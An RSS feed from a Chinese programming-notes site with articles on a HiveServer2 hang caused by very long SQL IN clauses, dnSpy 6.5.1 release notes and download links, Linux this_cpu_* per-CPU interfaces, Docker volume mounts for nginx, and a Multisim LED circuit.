<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
  <channel>
    <title>PPMY RSS</title>
    <link>https://www.ppmy.cn/news</link>
    <description>PPMY 网站文章 RSS</description>
    <docs>http://www.rssboard.org/rss-specification</docs>
    <generator>python-feedgen</generator>
    <language>zh-cn</language>
    <lastBuildDate>Fri, 31 Oct 2025 15:18:03 +0000</lastBuildDate>
    <item>
      <title>记录一次hiveserver2卡死(假死)问题</title>
      <link>https://www.ppmy.cn/news/1540932.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维记录一次hiveserver2卡死(假死)问题news/2025/10/31 23:19:47/问题描述给开发人员开通了个账号，连接hive进行查询，后来发现，hive服务有时候会卡死，查询不了，连不上（所有账号/客户端都连不上hive），但在chd里面看监控，服务器资源状态正常，查看hive日志也没发现明显异常。重启hiveServer2服务后，hive能恢复正常；或等待较长一段时间后也能自己恢复；但hive恢复后出异常的时间不规律；后又发现，在hive卡死期间，服务器后台查看到hive服务的cpu使用率很高问题原因和解决后来和开发沟通过程中，发现其构造的hive-sql中有些sql中用的 in子句里面有数万/十多万个值，导致拼接的sql非常长，经过验证，发现执行这种sql时，就会导致hive处于卡死状态；优化相关sql后，问题解决http://www.ppmy.cn/news/1540932.html相关文章目前最新 dnSpy V6.5.1版本，最好的 .NET 程序调试、编辑、反编译软件目前最新 dnSpy V6.5.1版本&amp;#xff0c;最好的 .NET 程序调试、编辑、反编译软件 一、 简介二、新发布程序更新功能三、官方下载&amp;#xff1a; 一、 简介 
dnSpy 是一个调试器 .NET 程序集的编辑器。即使没有源代码&amp;#xff0c;也可以使用它来编辑和调试程序集。主要特点&amp;#x…阅读更多...Linux内核 -- 高性能运算操作之 this_cpu_* 接口Linux this_cpu_* 接口的作用与用法 
Linux 内核中&amp;#xff0c;this_cpu_* 接口用于访问和操作每个 CPU 独有的 per-CPU 变量&amp;#xff0c;提供了一组高效的方法来处理 per-CPU 数据。在 SMP&amp;#xff08;对称多处理&amp;#xff09;系统中&amp;#xff0c;per-CPU 变量可以有效地减少缓存…阅读更多...Docker-nginx数据卷挂载数据卷&amp;#xff08;volume&amp;#xff09;是一个虚拟目录&amp;#xff0c;是容器内目录与宿主机目录之间映射的桥梁。 以Nginx为例&amp;#xff0c;我们知道Nginx中有两个关键的目录&amp;#xff1a; 
html&amp;#xff1a;放置一些静态资源conf&amp;#xff1a;放置配置文件 如果我们要让Nginx代理我们…阅读更多...基于Multisim8路彩灯循环控制电路设计与仿真1&amp;#xff0e;彩灯能够自动循环点亮&amp;#xff1b;
2&amp;#xff0e;彩灯循环频率快慢可调&amp;#xff1b;
3&amp;#xff0e;彩灯具有8路输出。
4&amp;#xff0e;自行设计脉冲信号产生电路。 链接&amp;#xff1a;https://pan.baidu.com/s/1PhpVy58Y6-_uXnie8KYyzg  提取码&amp;#xff1a;zjad阅读更多...STM32L010F4 最小系统设计画一个 STM32L010F4 的测试板子...... by 矜辰所致前言 
最近需要用到一个新的 MCU&amp;#xff1a; STM32L010F4 &amp;#xff0c;上次测试的 VL53L0X 需要移植到这个芯片上&amp;#xff0c;网上一搜 STM32L010F4&amp;#xff0c;都是介绍资料&amp;#xff0c;没有最小系统&amp;#xff0c;使用说明等。…阅读更多...使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:47 +0000</pubDate>
    </item>
    <item>
      <title>目前最新 dnSpy V6.5.1版本，最好的 .NET 程序调试、编辑、反编译软件</title>
      <link>https://www.ppmy.cn/news/1540931.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维目前最新 dnSpy V6.5.1版本，最好的 .NET 程序调试、编辑、反编译软件news/2025/10/31 23:19:46/目前最新 dnSpy V6.5.1版本，最好的 .NET 程序调试、编辑、反编译软件一、 简介二、新发布程序更新功能三、官方下载：一、 简介dnSpy 是一个调试器 .NET 程序集的编辑器。即使没有源代码，也可以使用它来编辑和调试程序集。主要特点：调试 .NET和Unity 程序集编辑 .NET和Unity 程序集调试 .NET Framework .NET 和 Unity 游戏程序集，无需源代码设置断点并进入任何程序集本地、观察、自动窗口变量窗口支持将变量（例如解密的字节数组）保存到磁盘或在十六进制编辑器（内存窗口）中查看它们对象 ID可以同时调试多个进程模块负载中断跟踪点和条件断点导出/导入断点和跟踪点系统库的可选“仅我的代码”（JMC）步进过滤器调用堆栈、线程、模块、进程窗口在抛出异常时中断（第一次机会）变量窗口支持评估 C# / Visual Basic表达式可以调试动态模块（但由于CLR 的限制，不能调试动态方法）输出窗口记录各种调试事件，默认情况下显示时间戳：）可以调试在运行时自行解密的程序集，dnSpy 将使用内存中的映像。还可以强制 dnSpy 始终使用内存中的映像而不是磁盘文件。常见调试器检测技术的旁路公共API，可以编写扩展或使用 C# 交互窗口来控制调试器目前 dnSpy、Reflector、ILSpy 是 .NET 软件调试和反编译的三剑客，程序各有千秋。当程序使用混淆软件进行混淆，使用这些软件验证是否混淆成功。当程序源代码丢失，使用这些软件进行程序反编译获得源代码。当程序存在错误，没有源代码，使用这些软件进行程序编辑调试修改错误。二、新发布程序更新功能新功能：在“文件”菜单下添加了一个新命令，以管理员身份重新启动dnSpy。这在调试需要提升的文件时很有帮助添加 .NET运行时到“文件”-&gt;“打开列表”中的预定义程序集列表添加了一个新的分析器节点，显示使用分析器组件分析的类型的所有子类型在启动调试对话框中添加了一个附加字段，允许用户自定义程序启动时使用的环境变量在 Windows 11 上运行 dnSpy 时，所有窗口现在都有圆角，以匹配该操作系统上的其他应用程序改进和错误修复：分析器组件中添加了对静态接口成员的支持。现在应该可以正确检测使用和实现。修复了伪自定义属性跳转到引用的问题，该问题有时会阻止该功能工作改进 XAML 语法突出显示改进了对具有特殊字符和显式接口实现的成员的 XML 文档查找改进了主文本视图以外控件的文本呈现性能和效率修复导致表流标头结构中的 m_ulExtra 字段具有不正确值的错误。修复了一个错误，该错误阻止了当文件为非文件时，在十六进制编辑器中显示数据命令在 PE 图像节头节点上显示。NET PE文件。更新翻译ILSpy 反编译器修复了具有无效泛型参数定义的嵌套类型发生的反编译器崩溃问题强制goto语句的C#代码标签始终使用填充到4字节的IL偏移量修复了反编译非常大的方法体时发生的堆栈溢出，导致dnSpy完全崩溃改进了方法调用中参数的处理三、官方下载：原始版本为 dnSpy V6.1.8，原作者已经停止更新和开发，源代码已经存档封闭为只读，dnSpyEx 是其它爱好者的更新开发。原始官方开源下载网站 ：https://github.com/dnSpy/dnSpy程序开源下载网站 ：https://github.com/dnSpyEx/dnSpy/releases程序 net-win32 V6.5.1版 ：https://github.com/dnSpyEx/dnSpy/releases/download/v6.5.1/dnSpy-net-win32.zip程序 net-win64 V6.5.1版 ：https://github.com/dnSpyEx/dnSpy/releases/download/v6.5.1/dnSpy-net-win64.zip程序 net-netframework V6.5.1版 ：https://github.com/dnSpyEx/dnSpy/releases/download/v6.5.1/dnSpy-netframework.zip程序源代码开源 V6.5.1 下载 ：https://github.com/dnSpyEx/dnSpy/archive/refs/tags/v6.5.1.ziphttp://www.ppmy.cn/news/1540931.html相关文章Linux内核 -- 高性能运算操作之 this_cpu_* 接口Linux this_cpu_* 接口的作用与用法 
Linux 内核中&amp;#xff0c;this_cpu_* 接口用于访问和操作每个 CPU 独有的 per-CPU 变量&amp;#xff0c;提供了一组高效的方法来处理 per-CPU 数据。在 SMP&amp;#xff08;对称多处理&amp;#xff09;系统中&amp;#xff0c;per-CPU 变量可以有效地减少缓存…阅读更多...Docker-nginx数据卷挂载数据卷&amp;#xff08;volume&amp;#xff09;是一个虚拟目录&amp;#xff0c;是容器内目录与宿主机目录之间映射的桥梁。 以Nginx为例&amp;#xff0c;我们知道Nginx中有两个关键的目录&amp;#xff1a; 
html&amp;#xff1a;放置一些静态资源conf&amp;#xff1a;放置配置文件 如果我们要让Nginx代理我们…阅读更多...基于Multisim8路彩灯循环控制电路设计与仿真1&amp;#xff0e;彩灯能够自动循环点亮&amp;#xff1b;
2&amp;#xff0e;彩灯循环频率快慢可调&amp;#xff1b;
3&amp;#xff0e;彩灯具有8路输出。
4&amp;#xff0e;自行设计脉冲信号产生电路。 链接&amp;#xff1a;https://pan.baidu.com/s/1PhpVy58Y6-_uXnie8KYyzg  提取码&amp;#xff1a;zjad阅读更多...STM32L010F4 最小系统设计画一个 STM32L010F4 的测试板子...... by 矜辰所致前言 
最近需要用到一个新的 MCU&amp;#xff1a; STM32L010F4 &amp;#xff0c;上次测试的 VL53L0X 需要移植到这个芯片上&amp;#xff0c;网上一搜 STM32L010F4&amp;#xff0c;都是介绍资料&amp;#xff0c;没有最小系统&amp;#xff0c;使用说明等。…阅读更多...使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:46 +0000</pubDate>
    </item>
    <item>
      <title>Linux内核 -- 高性能运算操作之 this_cpu_* 接口</title>
      <link>https://www.ppmy.cn/news/1540930.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Linux内核 -- 高性能运算操作之 this_cpu_* 接口news/2025/10/31 23:19:45/Linuxthis_cpu_*接口的作用与用法Linux 内核中，this_cpu_*接口用于访问和操作每个 CPU 独有的 per-CPU 变量，提供了一组高效的方法来处理 per-CPU 数据。在 SMP（对称多处理）系统中，per-CPU 变量可以有效地减少缓存一致性问题，提高性能，因为每个 CPU 维护独立的数据副本。this_cpu_*接口的主要作用是通过汇编指令对当前 CPU 上的 per-CPU 变量进行访问和操作。这样做的好处是减少访问数据时的锁竞争，提高内核代码的并发性能。常用的接口包括this_cpu_read()、this_cpu_write()、this_cpu_add()、this_cpu_sub()、this_cpu_inc()和this_cpu_dec()等。一、this_cpu_*接口的作用快速访问当前 CPU 的 per-CPU 变量：每个 CPU 上的数据都是独立的，因此在不需要加锁的情况下，可以提高数据访问的速度。减少锁竞争：在操作 per-CPU 数据时，避免了全局锁的使用，从而减少了 CPU 之间的同步开销和锁争用。高效的汇编实现：this_cpu_*接口通常会使用内嵌汇编实现，以确保操作的原子性。这些操作包括加法、减法、取值等操作。二、常用的this_cpu_*接口以下是一些常用的this_cpu_*接口及其功能：this_cpu_ptr()获取当前 CPU 的 per-CPU 变量的指针。用法示例：int*ptr=this_cpu_ptr(&amp;some_percpu_var);this_cpu_read()读取当前 CPU 的 per-CPU 变量的值。用法示例：intvalue=this_cpu_read(some_percpu_var);this_cpu_write()写入一个值到当前 CPU 的 per-CPU 变量。用法示例：this_cpu_write(some_percpu_var,10);this_cpu_add()对当前 CPU 的 per-CPU 变量执行加法操作。用法示例：this_cpu_add(some_percpu_var,5);this_cpu_sub()对当前 CPU 的 per-CPU 变量执行减法操作。用法示例：this_cpu_sub(some_percpu_var,3);this_cpu_inc()增加当前 CPU 的 per-CPU 变量的值（自增 1）。用法示例：this_cpu_inc(some_percpu_var);this_cpu_dec()减少当前 CPU 的 per-CPU 变量的值（自减 1）。用法示例：this_cpu_dec(some_percpu_var);this_cpu_xchg()原子地交换当前 CPU 的 per-CPU 变量的值。用法示例：intold_value=this_cpu_xchg(some_percpu_var,new_value);this_cpu_cmpxchg()执行一个原子比较并交换操作（compare and exchange）。用法示例：intold_value=this_cpu_cmpxchg(some_percpu_var,old_value,new_value);三、使用场景统计信息的收集在多核系统中，使用 per-CPU 变量进行统计可以减少锁竞争。例如，内核统计网络包的收发数量，使用this_cpu_add()更新计数器。中断处理中断上下文中通常不适合使用锁，因此可以使用this_cpu_*接口来处理 per-CPU 的中断统计，确保中断处理的高效性和低延迟。内存分配在内核的 slab 分配器中，使用 per-CPU 变量来维护 CPU 本地的缓存池，以加速内存的分配和释放。四、代码示例以下是一个简单的例子，演示如何使用this_cpu_*接口来操作 per-CPU 变量：#include&lt;linux/percpu.h&gt;#include&lt;linux/module.h&gt;#include&lt;linux/kernel.h&gt;DEFINE_PER_CPU(int,my_percpu_var);staticint__initmy_module_init(void){intcpu;// 初始化每个 CPU 的 per-CPU 变量for_each_possible_cpu(cpu){per_cpu(my_percpu_var,cpu)=0;}// 在当前 CPU 上增加 per-CPU 变量的值this_cpu_add(my_percpu_var,1);pr_info("Current CPU %d, my_percpu_var: %d\n",smp_processor_id(),this_cpu_read(my_percpu_var));return0;}staticvoid__exitmy_module_exit(void){intcpu;// 打印每个 CPU 的 per-CPU 变量值for_each_possible_cpu(cpu){pr_info("CPU %d, my_percpu_var: %d\n",cpu,per_cpu(my_percpu_var,cpu));}}module_init(my_module_init);module_exit(my_module_exit);MODULE_LICENSE("GPL");MODULE_AUTHOR("Example Author");MODULE_DESCRIPTION("A simple example of using this_cpu_* interface");五、注意事项原子性：this_cpu_*系列接口在实现上通常使用汇编来确保原子性，以避免在多处理器环境下出现竞态条件。比如this_cpu_add()，其实现确保了加法操作在多个 CPU 上是线程安全的。效率：由于this_cpu_*接口是基于当前 CPU 的，因此它们不需要访问其他 CPU 的缓存，也不需要获取锁，能够显著提高效率。特别是在频繁操作的场景下，per-CPU 数据能减少缓存一致性协议带来的开销。适用场景：这些接口只适用于 per-CPU 变量，不能用于全局共享的数据。如果需要在多个 CPU 之间共享数据，则应使用适当的同步机制，如自旋锁或读写锁。六、总结this_cpu_*系列接口是 Linux 内核中用于操作 per-CPU 变量的强大工具。它们提供了高效的 per-CPU 数据访问方法，适用于计数、统计等无需在多个 CPU 之间共享的数据。通过使用这些接口，开发人员可以提高内核代码的并发性和执行效率，特别是在 SMP 系统中。http://www.ppmy.cn/news/1540930.html相关文章Docker-nginx数据卷挂载数据卷&amp;#xff08;volume&amp;#xff09;是一个虚拟目录&amp;#xff0c;是容器内目录与宿主机目录之间映射的桥梁。 以Nginx为例&amp;#xff0c;我们知道Nginx中有两个关键的目录&amp;#xff1a; 
html&amp;#xff1a;放置一些静态资源conf&amp;#xff1a;放置配置文件 如果我们要让Nginx代理我们…阅读更多...基于Multisim8路彩灯循环控制电路设计与仿真1&amp;#xff0e;彩灯能够自动循环点亮&amp;#xff1b;
2&amp;#xff0e;彩灯循环频率快慢可调&amp;#xff1b;
3&amp;#xff0e;彩灯具有8路输出。
4&amp;#xff0e;自行设计脉冲信号产生电路。 链接&amp;#xff1a;https://pan.baidu.com/s/1PhpVy58Y6-_uXnie8KYyzg  提取码&amp;#xff1a;zjad阅读更多...STM32L010F4 最小系统设计画一个 STM32L010F4 的测试板子...... by 矜辰所致前言 
最近需要用到一个新的 MCU&amp;#xff1a; STM32L010F4 &amp;#xff0c;上次测试的 VL53L0X 需要移植到这个芯片上&amp;#xff0c;网上一搜 STM32L010F4&amp;#xff0c;都是介绍资料&amp;#xff0c;没有最小系统&amp;#xff0c;使用说明等。…阅读更多...使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:45 +0000</pubDate>
    </item>
    <item>
      <title>Docker-nginx数据卷挂载</title>
      <link>https://www.ppmy.cn/news/1540929.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维Docker-nginx数据卷挂载news/2025/10/31 23:19:44/数据卷（volume）是一个虚拟目录，是容器内目录与宿主机目录之间映射的桥梁。以Nginx为例，我们知道Nginx中有两个关键的目录：html：放置一些静态资源conf：放置配置文件如果我们要让Nginx代理我们的静态资源，最好是放到html目录；如果我们要修改Nginx的配置，最好是找到conf下的nginx.conf文件。但遗憾的是，容器运行的Nginx所有的文件都在容器内部。所以我们必须利用数据卷将两个目录与宿主机目录关联，方便我们操作。如图：在上图中：我们创建了两个数据卷：conf、htmlNginx容器内部的conf目录和html目录分别与两个数据卷关联。而数据卷conf和html分别指向了宿主机的/var/lib/docker/volumes/conf/_data目录和/var/lib/docker/volumes/html/_data目录这样以来，容器内的conf和html目录就 与宿主机的conf和html目录关联起来，我们称为挂载。此时，我们操作宿主机的/var/lib/docker/volumes/html/_data就是在操作容器内的/usr/share/nginx/html/_data目录。只要我们将静态资源放入宿主机对应目录，就可以被Nginx代理了。利用数据卷挂载nginx步骤：1. 创建数据卷docker volume create nginx_html2. 查询数据卷位置docker volume inspect nginx_html3.创建容器并指定数据卷，注意通过 -v 参数来指定数据卷docker run -d --name nginx81 -p 81:80 -v nginx_html:/usr/share/nginx/html nginx4.在/var/lib/docker/volumes/nginx_html/_data/ 目录下面添加一个静态文件index.html,文件里填写Hello world5.运行http://服务器ip:81/效果图：http://www.ppmy.cn/news/1540929.html相关文章基于Multisim8路彩灯循环控制电路设计与仿真1&amp;#xff0e;彩灯能够自动循环点亮&amp;#xff1b;
2&amp;#xff0e;彩灯循环频率快慢可调&amp;#xff1b;
3&amp;#xff0e;彩灯具有8路输出。
4&amp;#xff0e;自行设计脉冲信号产生电路。 链接&amp;#xff1a;https://pan.baidu.com/s/1PhpVy58Y6-_uXnie8KYyzg  提取码&amp;#xff1a;zjad阅读更多...STM32L010F4 最小系统设计画一个 STM32L010F4 的测试板子...... by 矜辰所致前言 
最近需要用到一个新的 MCU&amp;#xff1a; STM32L010F4 &amp;#xff0c;上次测试的 VL53L0X 需要移植到这个芯片上&amp;#xff0c;网上一搜 STM32L010F4&amp;#xff0c;都是介绍资料&amp;#xff0c;没有最小系统&amp;#xff0c;使用说明等。…阅读更多...使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
给你两个 句子 s1 和 s2 &amp;#xff0c;返回所有 不常用单词 的列表。返回列表中单词…阅读更多...随机数生成Math.random double val  Math.random();  生成的是[0,1]之间的浮点数&amp;#xff0c;  生成一个[120.500]区间的随机数 int and  Double.valueOf(Math.ceil(Math.random()*381120)).intValue();Math.ceil只取浮点数的整数部分  Math.random()的实现 private static final class R…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:44 +0000</pubDate>
    </item>
    <item>
      <title>基于Multisim8路彩灯循环控制电路设计与仿真</title>
      <link>https://www.ppmy.cn/news/1540928.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维基于Multisim8路彩灯循环控制电路设计与仿真news/2025/10/31 23:19:43/1．彩灯能够自动循环点亮；
2．彩灯循环频率快慢可调；
3．彩灯具有8路输出。
4．自行设计脉冲信号产生电路。链接：https://pan.baidu.com/s/1PhpVy58Y6-_uXnie8KYyzg提取码：zjadhttp://www.ppmy.cn/news/1540928.html相关文章STM32L010F4 最小系统设计画一个 STM32L010F4 的测试板子...... by 矜辰所致前言 
最近需要用到一个新的 MCU&amp;#xff1a; STM32L010F4 &amp;#xff0c;上次测试的 VL53L0X 需要移植到这个芯片上&amp;#xff0c;网上一搜 STM32L010F4&amp;#xff0c;都是介绍资料&amp;#xff0c;没有最小系统&amp;#xff0c;使用说明等。…阅读更多...使用Vscode配置ftp连接远程服务器（上传本地文件）1.安装插件 扩展商店搜sftp，点击进行安装。 2.配置json文件 crtl+shift+p 输入ftp配置命令 sftp:config {"name": "My Server",  //设置名字"host": "localhost"&lt;/阅读更多...uniapp上如何绑定全局事件总线（引入自定义全局组件例如弹窗）1、在main.js中挂载bus 
// main.js
Vue.prototype.$bus  new Vue();
uni.$bus  Vue.prototype.$bus;  // 确保在 uni 上绑定 
2、写一个全局弹窗组件 
&lt;template&gt;&lt;view v-if"visible" class"toast-container"&gt;&lt;view class"icon-conta…阅读更多...鸿蒙网络编程系列12-使用Request部件下载文件到本地示例1. Request下载文件简介 
在前述文章鸿蒙网络编程系列10-使用HttpRequest下载文件到本地示例中&amp;#xff0c;使用基础的HttpRequest模块演示了如何下载文件到本地&amp;#xff0c;整个下载过程看起来好像不太复杂&amp;#xff0c;但是&amp;#xff0c;如果考虑到可靠性、网络问题以及文件类型…阅读更多...图像处理中的图像重建图像重建是指通过对观测到的图像或图像数据进行处理和分析&amp;#xff0c;以恢复出原始或高质量的图像。图像重建常用于图像压缩、图像增强、图像修复等应用领域。 
以下是一些常见的图像重建方法&amp;#xff1a; 插值法&amp;#xff08;Interpolation&amp;#xff09;&amp;#xff1a;插值法是一…阅读更多...【从零开始的LeetCode-算法】884. 两句话中的不常见单词句子 是一串由空格分隔的单词。每个 单词 仅由小写字母组成。 
如果某个单词在其中一个句子中恰好出现一次&amp;#xff0c;在另一个句子中却 没有出现 &amp;#xff0c;那么这个单词就是 不常见的 。 
